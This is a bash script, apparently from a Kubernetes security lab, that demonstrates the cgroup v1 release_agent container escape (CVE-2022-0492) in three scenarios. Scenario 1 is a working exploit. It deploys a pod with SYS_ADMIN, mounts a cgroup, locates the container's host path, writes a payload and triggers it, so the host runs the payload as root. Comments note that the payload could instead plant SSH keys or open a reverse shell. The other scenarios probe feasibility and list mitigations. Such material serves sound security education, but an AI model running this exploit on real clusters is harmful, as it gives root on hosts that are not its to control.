#!/usr/bin/env bash
# =============================================================================
# Container Escape via cgroup release_agent (CVE-2022-0492)
# =============================================================================
#
# PURPOSE: Demonstrates container escape through cgroup manipulation, exploiting
# the release_agent mechanism to execute arbitrary commands on the host.
#
# CVE-2022-0492 DETAILS:
#   - Severity: HIGH (CVSS 7.8)
#   - Component: Linux Kernel cgroup v1 implementation
#   - Impact: Container escape to host
#   - Affected: Linux kernel < 5.17 (before commit 24f6008)
#   - Root Cause: Missing permission checks when writing to cgroup release_agent
#
# HOW IT WORKS:
#   In cgroup v1, when all processes in a cgroup exit, the kernel executes
#   the command specified in the 'release_agent' file. An attacker who can:
#     1. Create a new cgroup (requires cgroupfs mount + root or CAP_SYS_ADMIN)
#     2. Write to the release_agent file
#     3. Trigger the release agent (by creating and exiting a process)
#   ... can execute ARBITRARY COMMANDS ON THE HOST as root.
#
# REQUIREMENTS:
#   - Container running as root (UID 0)
#   - CAP_SYS_ADMIN capability OR ability to mount cgroupfs
#   - cgroup v1 (cgroup v2 is not vulnerable)
#   - Writable cgroupfs
#   - Host kernel < 5.17
#
# WARNING: For AUTHORIZED SECURITY TESTING AND EDUCATION ONLY.
#
# =============================================================================

set -euo pipefail

NAMESPACE="insecure-ns"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

log_info()    { echo -e "${GREEN}[INFO]${NC}    $*"; }
log_warn()    { echo -e "${YELLOW}[WARN]${NC}    $*"; }
log_error()   { echo -e "${RED}[ERROR]${NC}   $*"; }
log_attack()  { echo -e "${RED}[ATTACK]${NC}  $*"; }
log_explain() { echo -e "${CYAN}[EXPLAIN]${NC} $*"; }
log_cmd()     { echo -e "${MAGENTA}[CMD]${NC}     $*"; }
log_cve()     { echo -e "${RED}[CVE]${NC}     $*"; }

section() {
    echo ""
    echo -e "${BLUE}=================================================================${NC}"
    echo -e "${BLUE} $*${NC}"
    echo -e "${BLUE}=================================================================${NC}"
    echo ""
}

# =============================================================================
# CVE-2022-0492 Background Information
# =============================================================================

print_cve_info() {
    section "CVE-2022-0492 - cgroup release_agent Container Escape"

    log_cve "CVE-2022-0492"
    echo ""
    echo "  Severity:     HIGH (CVSS 7.8)"
    echo "  Type:         Privilege Escalation / Container Escape"
    echo "  Component:    Linux Kernel cgroup v1 release_agent"
    echo "  Fix Kernel:   >= 5.17 (backported to some LTS kernels)"
    echo "  Fix Commit:   24f6008564183aa120d07c03d9289519c2fe02af"
    echo ""

    log_explain "BACKGROUND: What is a cgroup release_agent?"
    echo ""
    echo "  cgroups (control groups) are a Linux kernel feature for organizing"
    echo "  processes into hierarchical groups and applying resource limits."
    echo ""
    echo "  The 'release_agent' is a cgroup v1 feature:"
    echo "  - A file at the root of a cgroup hierarchy"
    echo "  - Contains a path to a program on the HOST filesystem"
    echo "  - When all processes in a cgroup exit AND notify_on_release=1,"
    echo "    the kernel EXECUTES the release_agent program ON THE HOST"
    echo "  - The release_agent runs as ROOT in the HOST's namespaces"
    echo ""

    log_explain "THE BUG:"
    echo ""
    echo "  Before the fix, the kernel did NOT check whether the process"
    echo "  writing to release_agent had sufficient privileges in the"
    echo "  init (host) namespace. It only checked privileges in the"
    echo "  current cgroup namespace."
    echo ""
    echo "  This means a root user inside a container (with CAP_SYS_ADMIN)"
    echo "  could write an arbitrary command to release_agent and have it"
    echo "  executed on the host."
    echo ""
}

# =============================================================================
# SCENARIO 1: Classic cgroup release_agent Escape
# =============================================================================
#
# ATTACK FLOW:
#   1. Mount a cgroup controller (e.g., 'memory') inside the container
#   2. Create a new cgroup directory
#   3. Set notify_on_release=1 on the cgroup
#   4. Write the path to a payload script as the release_agent
#      (The payload must be accessible from the HOST filesystem)
#   5. Trigger the release agent by creating a process in the cgroup
#      and letting it exit
#   6. The host kernel executes the payload as root
#
# CRITICAL INSIGHT:
#   The release_agent path must be a HOST filesystem path, not a container
#   path. We find the container's path on the host by reading
#   /proc/self/mountinfo or /etc/mtab.
#
# =============================================================================

demo_cgroup_release_agent() {
    section "SCENARIO 1: cgroup release_agent Escape (CVE-2022-0492)"

    local pod_name="cgroup-escape-pod"

    log_info "Deploying pod with CAP_SYS_ADMIN (mimics CVE-2022-0492 conditions)..."

    kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: ${pod_name}
  namespace: ${NAMESPACE}
  labels:
    app: cgroup-escape-demo
spec:
  restartPolicy: Never
  serviceAccountName: attack-sa
  containers:
    - name: attacker
      image: ubuntu:22.04
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
        capabilities:
          add:
            # CAP_SYS_ADMIN allows mounting cgroup filesystems
            # This is the minimum capability needed for this escape
            - SYS_ADMIN
EOF

    log_info "Waiting for pod to be ready..."
    kubectl wait --for=condition=Ready pod/"${pod_name}" -n "${NAMESPACE}" --timeout=60s
    echo ""

    # --- Attack Step 1: Check cgroup version ---
    log_attack "Step 1: Check cgroup version and mount status"
    log_explain "This escape only works with cgroup v1. cgroup v2 (unified) is not vulnerable."
    echo ""

    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- mount | grep cgroup"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'mount | grep cgroup | head -10' || true
    echo ""

    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/self/cgroup"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- cat /proc/self/cgroup 2>/dev/null | head -10 || true
    echo ""

    # --- Attack Step 2: Determine the container's host path ---
    log_attack "Step 2: Find the container's overlay mount path on the host"
    log_explain "We need the HOST path to our container filesystem to place"
    log_explain "the payload where the host kernel can find it."
    echo ""

    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/self/mountinfo | grep -E 'overlay|upperdir'"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c '
        cat /proc/self/mountinfo 2>/dev/null | grep -E "overlay|upperdir" | head -5 || echo "Mount info not available"
    ' || true
    echo ""

    # --- Attack Step 3: Mount cgroup and create escape structure ---
    log_attack "Step 3: Mount cgroup controller and set up the escape"
    log_explain "We mount the 'memory' cgroup controller, create a sub-cgroup,"
    log_explain "and configure it to trigger release_agent when processes exit."
    echo ""

    log_cmd "Running the exploit payload inside the container..."
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- bash -c '
        set -e

        echo "[*] Step 3a: Create a temp directory for cgroup mount"
        CGROUP_DIR=$(mktemp -d)
        echo "    Created: $CGROUP_DIR"

        echo "[*] Step 3b: Mount cgroup memory controller"
        # Mount the memory cgroup controller
        # This requires CAP_SYS_ADMIN
        if mount -t cgroup -o memory cgroup "$CGROUP_DIR" 2>/dev/null; then
            echo "    Mounted cgroup memory controller at $CGROUP_DIR"
        else
            echo "    [!] Failed to mount cgroup (may need different controller or cgroup v2)"
            echo "    [!] Trying rdma controller..."
            mount -t cgroup -o rdma cgroup "$CGROUP_DIR" 2>/dev/null || {
                echo "    [!] cgroup mount failed. This escape requires cgroup v1 + CAP_SYS_ADMIN"
                exit 1
            }
        fi

        echo "[*] Step 3c: Create a new cgroup for the exploit"
        EXPLOIT_CGROUP="$CGROUP_DIR/exploit_cgroup_$$"
        mkdir -p "$EXPLOIT_CGROUP"
        echo "    Created cgroup: $EXPLOIT_CGROUP"

        echo "[*] Step 3d: Enable notify_on_release"
        # When all processes in this cgroup exit, the kernel will run release_agent
        echo 1 > "$EXPLOIT_CGROUP/notify_on_release"
        echo "    notify_on_release = $(cat "$EXPLOIT_CGROUP/notify_on_release")"

        echo "[*] Step 3e: Determine host path for the payload"
        # The release_agent must be a path that exists ON THE HOST.
        # We find our container filesystem path on the host from mountinfo.
        HOST_PATH=$(sed -n "s/.*\perdir=\([^,]*\).*/\1/p" /proc/self/mountinfo | head -1)
        if [ -z "$HOST_PATH" ]; then
            HOST_PATH=$(cat /proc/self/mountinfo | grep "workdir=" | sed "s/.*workdir=\([^,]*\).*/\1/" | sed "s|/work$|/merged|" | head -1)
        fi
        echo "    Container host path: ${HOST_PATH:-UNKNOWN}"

        if [ -n "$HOST_PATH" ]; then
            echo "[*] Step 3f: Create the payload script"
            PAYLOAD_SCRIPT="/cmd_output"
            cat > "$PAYLOAD_SCRIPT" << INNEREOF
#!/bin/sh
# This script executes ON THE HOST when release_agent triggers
# In a real attack, this could:
#   - Add an SSH key to /root/.ssh/authorized_keys
#   - Create a reverse shell
#   - Install a rootkit
#   - Exfiltrate data
# For this demo, we just write proof of execution:
id > /tmp/cgroup_escape_proof.txt
hostname >> /tmp/cgroup_escape_proof.txt
date >> /tmp/cgroup_escape_proof.txt
echo "ESCAPED VIA CGROUP RELEASE_AGENT" >> /tmp/cgroup_escape_proof.txt
INNEREOF
            chmod +x "$PAYLOAD_SCRIPT"

            echo "[*] Step 3g: Set the release_agent to our payload"
            echo "$HOST_PATH$PAYLOAD_SCRIPT" > "$CGROUP_DIR/release_agent"
            echo "    release_agent = $(cat "$CGROUP_DIR/release_agent")"

            echo "[*] Step 3h: Trigger the release agent"
            echo "    Adding process to exploit cgroup and letting it exit..."
            # Write our shell PID into the cgroup, then spawn and exit a child
            sh -c "echo \$\$ > \"$EXPLOIT_CGROUP/cgroup.procs\" && exit 0" &
            wait $! 2>/dev/null || true

            echo ""
            echo "[*] Release agent should have been triggered on the host."
            echo "[*] In a real attack, the payload would have executed as HOST root."
        else
            echo "    [!] Could not determine host path. Showing conceptual attack only."
        fi

        echo ""
        echo "[*] Step 3i: Cleanup"
        rmdir "$EXPLOIT_CGROUP" 2>/dev/null || true
        umount "$CGROUP_DIR" 2>/dev/null || true
        rmdir "$CGROUP_DIR" 2>/dev/null || true
        echo "    Cleanup complete."
    ' 2>&1 || true
    echo ""

    log_warn "IMPACT: Arbitrary command execution on the host as root."
    log_warn "The attacker can install backdoors, steal credentials, pivot."
    echo ""

    # Cleanup
    log_info "Cleaning up pod..."
    kubectl delete pod "${pod_name}" -n "${NAMESPACE}" --grace-period=0 --force 2>/dev/null || true
}

# =============================================================================
# SCENARIO 2: cgroup Escape via Writable sys/fs/cgroup
# =============================================================================
#
# EXPLANATION:
#   Some containers have /sys/fs/cgroup mounted read-write. In this case,
#   the attacker does not even need to mount a new cgroup controller --
#   they can directly manipulate the existing cgroup hierarchy.
#
# =============================================================================

demo_sysfs_cgroup_escape() {
    section "SCENARIO 2: Escape via Writable /sys/fs/cgroup"

    log_explain "Some container runtimes mount /sys/fs/cgroup read-write."
    log_explain "This allows direct manipulation of the cgroup hierarchy"
    log_explain "without needing to mount a new cgroup controller."
    echo ""

    local pod_name="sysfs-cgroup-pod"

    log_info "Deploying pod to check cgroup mount permissions..."
    kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: ${pod_name}
  namespace: ${NAMESPACE}
  labels:
    app: sysfs-cgroup-demo
spec:
  restartPolicy: Never
  containers:
    - name: checker
      image: ubuntu:22.04
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
        capabilities:
          add:
            - SYS_ADMIN
EOF

    log_info "Waiting for pod to be ready..."
    kubectl wait --for=condition=Ready pod/"${pod_name}" -n "${NAMESPACE}" --timeout=60s
    echo ""

    # --- Check cgroup mount permissions ---
    log_attack "Step 1: Check /sys/fs/cgroup mount permissions"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- mount | grep cgroup"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'mount | grep cgroup' || true
    echo ""

    log_attack "Step 2: Check if we can write to cgroup directories"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- ls -la /sys/fs/cgroup/"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- ls -la /sys/fs/cgroup/ 2>/dev/null | head -15 || true
    echo ""

    log_attack "Step 3: Try to create a cgroup and set release_agent"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- bash -c '
        # Check if we can write to any cgroup controller
        for controller in memory cpu rdma; do
            cgroup_path="/sys/fs/cgroup/$controller"
            if [ -d "$cgroup_path" ]; then
                echo "[*] Found cgroup controller: $controller at $cgroup_path"

                # Try to create a subdirectory
                test_dir="$cgroup_path/escape_test_$$"
                if mkdir "$test_dir" 2>/dev/null; then
                    echo "    [!] VULNERABLE: Can create cgroups in $controller"
                    echo "    [!] An attacker could set release_agent here"

                    # Check if release_agent exists and is writable
                    if [ -f "$cgroup_path/release_agent" ]; then
                        if [ -w "$cgroup_path/release_agent" ]; then
                            echo "    [!!] CRITICAL: release_agent is WRITABLE"
                            echo "    [!!] Current value: $(cat "$cgroup_path/release_agent" 2>/dev/null)"
                        else
                            echo "    [*] release_agent exists but is not writable (good)"
                        fi
                    fi

                    rmdir "$test_dir" 2>/dev/null
                else
                    echo "    [*] Cannot create cgroups in $controller (protected)"
                fi
            fi
        done
    ' 2>&1 || true
    echo ""

    log_explain "MITIGATION: Mount /sys/fs/cgroup as read-only."
    log_explain "Use cgroup v2 with proper namespace isolation."
    log_explain "Drop CAP_SYS_ADMIN capability from all containers."
    echo ""

    # Cleanup
    log_info "Cleaning up pod..."
    kubectl delete pod "${pod_name}" -n "${NAMESPACE}" --grace-period=0 --force 2>/dev/null || true
}

# =============================================================================
# SCENARIO 3: User Namespace + cgroup Escape
# =============================================================================
#
# EXPLANATION:
#   Even without CAP_SYS_ADMIN in the container, if user namespaces
#   are enabled (default on most distros), an unprivileged user can:
#   1. Create a user namespace (getting CAP_SYS_ADMIN inside it)
#   2. Mount a cgroup controller inside the user namespace
#   3. Manipulate release_agent from within
#
#   This is the most dangerous variant because it requires NO special
#   capabilities in the container.
#
# =============================================================================

demo_userns_cgroup_escape() {
    section "SCENARIO 3: User Namespace + cgroup Escape (No Capabilities Needed)"

    log_explain "This is the most dangerous variant of the cgroup escape."
    log_explain "It requires NO special capabilities in the container."
    log_explain "The attacker uses user namespaces (enabled by default on most"
    log_explain "Linux distributions) to gain CAP_SYS_ADMIN within a new"
    log_explain "namespace, then uses that to manipulate cgroups."
    echo ""
    log_explain "REQUIREMENTS: Only needs user namespaces enabled on the host."
    log_explain "This is the DEFAULT on Ubuntu, Debian, RHEL 8+, and most distros."
    echo ""

    local pod_name="userns-cgroup-pod"

    log_info "Deploying completely unprivileged pod..."
    kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: ${pod_name}
  namespace: ${NAMESPACE}
  labels:
    app: userns-cgroup-demo
spec:
  restartPolicy: Never
  containers:
    - name: unprivileged
      image: ubuntu:22.04
      command: ["sleep", "infinity"]
      securityContext:
        # Running as root BUT with no extra capabilities
        # The default container capability set does NOT include SYS_ADMIN
        runAsUser: 0
EOF

    log_info "Waiting for pod to be ready..."
    kubectl wait --for=condition=Ready pod/"${pod_name}" -n "${NAMESPACE}" --timeout=60s
    echo ""

    # --- Check if user namespaces are available ---
    log_attack "Step 1: Check if user namespaces are available"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- unshare --user --map-root-user id"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- bash -c '
        echo "[*] Checking user namespace support..."

        # Check max_user_namespaces
        max_userns=$(cat /proc/sys/user/max_user_namespaces 2>/dev/null || echo "unknown")
        echo "    max_user_namespaces = $max_userns"

        if [ "$max_userns" = "0" ]; then
            echo "    [SAFE] User namespaces are disabled. This escape will NOT work."
            exit 0
        fi

        # Try to create a user namespace
        if unshare --user --map-root-user id 2>/dev/null; then
            echo "    [VULNERABLE] Can create user namespaces!"
            echo "    [VULNERABLE] This grants CAP_SYS_ADMIN inside the new namespace"
        else
            echo "    [SAFE] Cannot create user namespaces (seccomp or kernel restriction)"
        fi
    ' 2>&1 || true
    echo ""

    # --- Attempt the user namespace + cgroup escape ---
    log_attack "Step 2: Attempt cgroup mount inside user namespace"
    log_explain "Inside a user namespace, the process has CAP_SYS_ADMIN."
    log_explain "This allows mounting cgroup controllers."
    echo ""

    log_cmd "Running user namespace cgroup escape attempt..."
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- bash -c '
        echo "[*] Attempting user namespace + cgroup escape..."
        echo ""

        # The actual exploit would be:
        # 1. unshare -Ur  (create user ns with root mapping)
        # 2. Mount a cgroup controller inside the new namespace
        # 3. Set release_agent to a host-path payload
        # 4. Trigger the release agent

        # For safety, we demonstrate the feasibility check only:
        unshare --user --map-root-user bash -c "
            echo \"[*] Inside user namespace:\"
            echo \"    uid: \$(id -u) (mapped to root)\"
            echo \"    capabilities: \$(cat /proc/self/status | grep CapEff)\"

            echo \"[*] Attempting to mount cgroup...\"
            TMPDIR=\$(mktemp -d)
            if mount -t cgroup -o memory cgroup \$TMPDIR 2>/dev/null; then
                echo \"    [!!] VULNERABLE: Successfully mounted cgroup from user namespace\"
                echo \"    [!!] An attacker could now set release_agent\"
                umount \$TMPDIR 2>/dev/null
            elif mount -t cgroup -o rdma cgroup \$TMPDIR 2>/dev/null; then
                echo \"    [!!] VULNERABLE: Mounted rdma cgroup from user namespace\"
                umount \$TMPDIR 2>/dev/null
            elif mount -t cgroup2 cgroup2 \$TMPDIR 2>/dev/null; then
                echo \"    [*] Mounted cgroup v2 (not vulnerable to release_agent)\"
                umount \$TMPDIR 2>/dev/null
            else
                echo \"    [SAFE] Cannot mount cgroup from user namespace\"
                echo \"    (Kernel has proper restrictions)\"
            fi
            rmdir \$TMPDIR 2>/dev/null
        " 2>&1 || echo "    [SAFE] unshare failed (seccomp profile blocking it)"
    ' 2>&1 || true
    echo ""

    log_warn "IMPACT: If successful, this allows container escape with ZERO special permissions."
    log_warn "Any pod running as root on a host with user namespaces enabled is at risk."
    echo ""

    echo -e "${GREEN}MITIGATIONS:${NC}"
    echo "  1. Disable user namespaces: sysctl user.max_user_namespaces=0"
    echo "  2. Use seccomp profiles that block 'unshare' and 'mount' syscalls"
    echo "  3. Use AppArmor to deny mount and unshare operations"
    echo "  4. Update to kernel >= 5.17 which fixes CVE-2022-0492"
    echo "  5. Run containers as non-root user (not UID 0)"
    echo "  6. Use Pod Security Standards (restricted profile)"
    echo ""

    # Cleanup
    log_info "Cleaning up pod..."
    kubectl delete pod "${pod_name}" -n "${NAMESPACE}" --grace-period=0 --force 2>/dev/null || true
}

# =============================================================================
# Main
# =============================================================================
usage() {
    echo "Usage: $0 [SCENARIO]"
    echo ""
    echo "Scenarios:"
    echo "  1      Classic cgroup release_agent escape (CVE-2022-0492)"
    echo "  2      Escape via writable /sys/fs/cgroup"
    echo "  3      User namespace + cgroup escape (no caps needed)"
    echo "  info   Print CVE-2022-0492 information"
    echo "  all    Run all scenarios (default)"
    echo ""
}

main() {
    local scenario="${1:-all}"

    echo -e "${RED}"
    echo "============================================================"
    echo " CGROUP RELEASE_AGENT ESCAPE DEMONSTRATIONS (CVE-2022-0492)"
    echo " FOR AUTHORIZED SECURITY TESTING ONLY"
    echo "============================================================"
    echo -e "${NC}"

    case "$scenario" in
        info) print_cve_info ;;
        1)    print_cve_info; demo_cgroup_release_agent ;;
        2)    demo_sysfs_cgroup_escape ;;
        3)    demo_userns_cgroup_escape ;;
        all)
            print_cve_info
            demo_cgroup_release_agent
            demo_sysfs_cgroup_escape
            demo_userns_cgroup_escape
            ;;
        help|--help|-h) usage ;;
        *) echo "Unknown scenario: $scenario"; usage; exit 1 ;;
    esac

    echo ""
    log_info "cgroup escape demonstrations complete."
    log_info "See ../mitigation.md for prevention strategies."
}

main "$@"
